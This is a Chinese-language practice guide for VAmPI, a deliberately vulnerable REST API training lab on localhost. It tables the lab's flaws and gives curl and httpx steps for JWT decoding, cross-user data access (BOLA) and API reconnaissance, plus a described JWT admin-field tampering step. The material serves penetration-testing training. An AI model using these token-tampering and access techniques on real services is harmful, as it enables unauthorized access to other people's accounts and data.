# VAmPI — Vulnerable REST API

> **技术栈**: Python 3 + Flask + SQLite | **访问**: http://localhost:5000
> **API 文档**: http://localhost:5000/ui/ (Swagger UI)
> **注册**: `POST /users/v1/register` 创建账号后获取 JWT

## 为什么练习 VAmPI

VAmPI 是一个 **纯 API 漏洞靶场**，没有前端页面——所有交互通过 curl / Burp / Postman 进行，模拟真实的 API 渗透测试场景。它特别适合练习：

- **JWT 权限提升** — 修改 Token 中的 `admin` 字段实现越权
- **API 信息泄露** — Swagger/OpenAPI 文档暴露
- **BOLA/IDOR** — 跨用户访问其他用户的数据
- **速率限制绕过** — 暴力破解 login/register 接口

## 漏洞清单

| 漏洞 | API 端点 | 对应技能 | 工具 |
|:-----|:---------|:---------|:-----|
| JWT 越权 | `GET /users/v1/<user>` | `jwt-privilege-escalation` | jwt.io, jq |
| BOLA (IDOR) | `GET /users/v1/<user>/email` | `idor-broken-object-authorization` | curl |
| API 文档暴露 | `GET /ui/` (Swagger) | `api-recon-and-docs` | httpx |
| 敏感信息泄露 | `GET /users/v1/_debug` | `insecure-source-code-management` | curl |
| 用户名枚举 | `POST /users/v1/register` | `authbypass-authentication-flaws` | curl |
| 弱 JWT 密钥 | JWT HS256 signing | `jwt-oauth-token-attacks` | jwt_tool |
| SQL Injection | 部分查询参数 | `sqli-sql-injection` | sqlmap |

## JWT 权限提升练习（核心）

这是练习 `jwt-privilege-escalation` 技能的最佳靶场：

```bash
# Step 1: 注册两个用户
curl -X POST http://localhost:5000/users/v1/register \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"pass123"}'

curl -X POST http://localhost:5000/users/v1/register \
  -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"pass456"}'

# Step 2: 登录获取 JWT
TOKEN=$(curl -s -X POST http://localhost:5000/users/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"pass123"}' | jq -r '.auth_token')

# Step 3: 解码 JWT
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Step 4: 用 alice 的 Token 尝试访问 bob 的数据（BOLA）
curl http://localhost:5000/users/v1/bob \
  -H "Authorization: Bearer $TOKEN"

# Step 5: 修改 JWT payload 中的 admin 字段，尝试访问管理接口
# (解码 → 修改 admin: true → 重新编码)
```

## 配合 Swagger UI 的信息收集

```bash
# 用 httpx 探测 API 技术栈
httpx -u http://localhost:5000 -tech-detect

# 检查 Swagger 文档
curl http://localhost:5000/ui/

# 查看 OpenAPI 规范 (如果可用)
curl http://localhost:5000/openapi.json
```

## 练习重点

| 优先级 | 技能 | 原因 |
|:---|:-----|:-----|
| 🥇 | `jwt-privilege-escalation` | VAmPI 核心漏洞就是 JWT 越权 |
| 🥈 | `idor-broken-object-authorization` | 跨用户数据访问 |
| 🥉 | `api-recon-and-docs` | API 侦察方法论 |
| 4 | `sqli-sql-injection` | 部分接口存在注入点 |
